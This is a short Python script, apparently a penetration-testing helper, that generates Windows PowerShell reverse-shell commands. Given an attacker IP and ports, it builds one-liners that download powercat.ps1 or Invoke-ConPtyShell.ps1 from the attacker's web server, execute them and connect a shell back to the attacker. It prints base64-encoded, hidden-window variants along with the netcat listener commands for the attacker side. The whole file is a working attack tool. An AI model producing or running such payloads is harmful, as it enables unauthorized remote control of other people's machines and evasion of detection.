import sys
import base64
ip = ""
port= ""
host_port = ""

def psr(ip, port,host_port):
    payload_ = "IEX(New-Object System.Net.WebClient).DownloadString('http://"+ip+":"+host_port+"/Windows_Tools/powercat.ps1'); powercat -c "+ip+" -p "+port+" -e powershell"
    cmd_ = "powershell.exe -nop -w hidden -e " + base64.b64encode(payload_.encode('utf16')[2:]).decode()
    print("powershell.exe -nop -w hidden "+ payload_)
    print(cmd_)
    print("on attacker: nc -lvnp "+port)
    main()

def con(ip, port, host_port):

    payload = 'IEX(IWR http://'+ip+':'+host_port+'/Windows_Tools/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ' + ip +' '+ port
    cmd = "powershell.exe -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
    print("powershell.exe -nop -w hidden "+ payload)
    print(cmd)
    print("On the Attacker: stty raw -echo; (stty size; cat) | nc -lvnp "+port)
    main()

def main():
    global ip,port,host_port
    host_port="80"
    print("Please enter the IP,Web Server port  and Port Details:")
    ip_ = input("IP:")
    if len(ip_)>0:
        ip = ip_
    port_ = input ("Port:")
    if len(port_)>0:
        port = port_
    host_port_ =input("Web server Listening Port:")
    if len(host_port_)>0:
        host_port=host_port_
    print("1 to PowerCat | 2 to Conpty | 3 to Change the IP/Port")
    input_ = input("Selection:")
    if input_ == "1":
        psr(ip,port,host_port)
    if input_ == "2":
        con(ip,port,host_port)
    if input_ == "3":
        main()
        
    else:
        print("error")
main()
